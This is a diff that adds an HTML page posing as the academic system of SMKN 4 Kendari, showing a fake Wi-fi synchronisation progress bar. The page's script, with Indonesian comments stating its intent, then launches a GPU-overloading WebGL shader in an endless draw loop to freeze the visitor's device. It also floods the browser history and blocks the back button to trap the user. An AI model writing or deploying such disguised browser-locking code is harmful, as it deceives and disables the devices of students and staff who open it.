@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SISTEM AKADEMIK SMKN 4 KENDARI</title>
+    <style>
+        body { margin: 0; background: #000; color: #fff; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.05; }
+        .content { z-index: 10; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h1>Sinkronisasi Wi-fi...</h1>
+        <p>Mohon jangan tutup halaman ini.</p>
+        <h2 id="load">0%</h2>
+    </div>
+    <canvas id="glCanvas"></canvas>
+
+    <script>
+        // 1. Loading Palsu biar mereka nunggu
+        let load = 0;
+        let loader = setInterval(() => {
+            load += Math.floor(Math.random() * 5);
+            if(load >= 100) {
+                document.getElementById('load').innerText = "MENYIMPAN DATA...";
+                clearInterval(loader);
+                startMeltdown();
+            } else {
+                document.getElementById('load').innerText = load + "%";
+            }
+        }, 100);
+
+        function startMeltdown() {
+            const canvas = document.getElementById("glCanvas");
+            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+
+            if (!gl) return;
+
+            // 2. Shader Gila (Memaksa GPU kerja rodi)
+            const vs = `attribute vec4 position; void main() { gl_Position = position; }`;
+            const fs = `
+                precision highp float;
+                void main() {
+                    vec2 uv = gl_FragCoord.xy;
+                    float d = 0.0;
+                    for (float i = 0.0; i < 10000.0; i++) {
+                        d += sin(uv.x * i) * cos(uv.y * i);
+                    }
+                    gl_FragColor = vec4(vec3(d), 1.0);
+                }
+            `;
+
+            function createShader(gl, type, source) {
+                const s = gl.createShader(type);
+                gl.shaderSource(s, source);
+                gl.compileShader(s);
+                return s;
+            }
+
+            const program = gl.createProgram();
+            gl.attachShader(program, createShader(gl, gl.VERTEX_SHADER, vs));
+            gl.attachShader(program, createShader(gl, gl.FRAGMENT_SHADER, fs));
+            gl.linkProgram(program);
+            gl.useProgram(program);
+
+            const buffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]), gl.STATIC_DRAW);
+
+            const pos = gl.getAttribLocation(program, "position");
+            gl.enableVertexAttribArray(pos);
+            gl.vertexAttribPointer(pos, 2, gl.FLOAT, false, 0, 0);
+
+            // 3. Infinite Draw Loop (Gak kasih napas buat sistem)
+            function draw() {
+                for(let i=0; i<500; i++) { // Loop internal buat nambah beban
+                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+                }
+                // Spam Memory & Tab
+                console.log("FREEZING SYSTEM... " + Math.random());
+                requestAnimationFrame(draw);
+            }
+            draw();
+
+            // 4. History Flood biar gak bisa back
+            setInterval(() => {
+                window.history.pushState(null, "", window.location.href);
+            }, 10);
+        }
+
+        window.onpopstate = () => { history.go(1); };
+    </script>
+</body>
+</html>
